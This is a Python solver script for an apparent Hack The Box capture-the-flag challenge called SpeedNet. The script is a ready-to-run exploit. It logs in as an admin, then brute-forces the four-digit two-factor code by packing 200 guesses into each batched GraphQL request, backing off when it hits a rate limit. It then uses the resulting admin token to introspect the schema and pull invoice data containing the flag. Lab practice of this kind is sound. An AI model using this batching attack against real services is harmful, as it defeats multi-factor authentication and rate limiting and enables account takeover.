#!/usr/bin/env python3
"""Solve the user-owned HTB SpeedNet instance's GraphQL OTP challenge."""

import getpass
import json
import re
import sys
import time
import urllib.error
import urllib.request


URL = "http://<HOST>:<PORT>/graphql"  # Replace with your current HTB instance.
EMAIL = "admin@speednet.htb"
BATCH_SIZE = 200
DELAY_SECONDS = 1

LOGIN = (
    "mutation Login($email:String!,$password:String!){"
    "login(email:$email,password:$password){token}}"
)
VERIFY = (
    "mutation Verify($token:String!,$otp:String!){"
    "verifyTwoFactor(token:$token,otp:$otp){token}}"
)
INVOICE_TYPE = (
    '{__type(name:"Invoice"){fields{name type{kind name '
    "ofType{kind name ofType{kind name}}}}}}"
)


def post(payload, auth=None):
    headers = {"Content-Type": "application/json"}
    if auth:
        headers["Authorization"] = auth
    request = urllib.request.Request(
        URL,
        data=json.dumps(payload, separators=(",", ":")).encode(),
        headers=headers,
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=15) as response:
        return json.load(response)


def rate_limited(results):
    items = results if isinstance(results, list) else [results]
    for item in items:
        for error in item.get("errors", []):
            message = error.get("message", "").lower()
            if "rate limit" in message or "too many requests" in message:
                return True
    return False


def leaf_kind(type_info):
    while type_info and type_info.get("kind") in ("NON_NULL", "LIST"):
        type_info = type_info.get("ofType")
    return type_info.get("kind") if type_info else None


def main():
    password = getpass.getpass(f"Password for {EMAIL}: ")
    try:
        login = post({"query": LOGIN, "variables": {"email": EMAIL, "password": password}})
    except (urllib.error.URLError, TimeoutError) as error:
        sys.exit(f"Login request failed: {error}")
    del password

    messages = [error.get("message", "") for error in login.get("errors", [])]
    pending = next((m.split("2FA_REQUIRED:", 1)[1] for m in messages
                    if m.startswith("2FA_REQUIRED:")), None)
    if not pending:
        sys.exit(f"Expected 2FA_REQUIRED. Server response: {login}")
    print("Fresh admin 2FA challenge received.")

    jwt = None
    found_otp = None
    for start in range(0, 10000, BATCH_SIZE):
        guesses = [f"{n:04d}" for n in range(start, min(start + BATCH_SIZE, 10000))]
        batch = [
            {"query": VERIFY, "variables": {"token": pending, "otp": otp}}
            for otp in guesses
        ]
        print(f"Testing {guesses[0]}–{guesses[-1]}", flush=True)

        for attempt in range(4):
            try:
                results = post(batch)
            except urllib.error.HTTPError as error:
                if error.code == 429 and attempt < 3:
                    time.sleep(10)
                    continue
                sys.exit(f"HTTP {error.code} while testing {guesses[0]}–{guesses[-1]}")
            except (urllib.error.URLError, TimeoutError) as error:
                sys.exit(f"Request failed: {error}")
            if rate_limited(results) and attempt < 3:
                time.sleep(10)
                continue
            break

        if not isinstance(results, list) or len(results) != len(guesses):
            sys.exit(f"Unexpected batch response: {str(results)[:500]}")
        if rate_limited(results):
            sys.exit("Rate limit persisted; stop and retry later with a fresh login.")

        for otp, result in zip(guesses, results):
            candidate = (result.get("data") or {}).get("verifyTwoFactor")
            if isinstance(candidate, dict) and candidate.get("token"):
                jwt = candidate["token"]
                found_otp = otp
                break
        if jwt:
            break
        time.sleep(DELAY_SECONDS)

    if not jwt:
        sys.exit("No valid OTP found. Check whether the challenge expired or changed.")
    print(f"Admin OTP found: {found_otp}")
    print("Admin JWT kept in memory for the invoice query.")

    invoice_type = post({"query": INVOICE_TYPE}, auth=jwt)
    fields = (invoice_type.get("data") or {}).get("__type", {}).get("fields", [])
    scalar_names = [field["name"] for field in fields
                    if leaf_kind(field.get("type")) in ("SCALAR", "ENUM")]
    if not scalar_names:
        sys.exit(f"Could not discover Invoice scalar fields: {invoice_type}")
    selection = " ".join(scalar_names)
    invoices = post({"query": (
        "query { currentInvoice { " + selection + " } "
        "invoiceHistory(limit:100) { " + selection + " } }"
    )}, auth=jwt)
    matches = re.findall(r"HTB\{[^}]+\}", json.dumps(invoices))
    if matches:
        print("Flag:", matches[0])
    else:
        print("No flag matched in invoice response. Inspect this response:")
        print(json.dumps(invoices, indent=2))


if __name__ == "__main__":
    main()
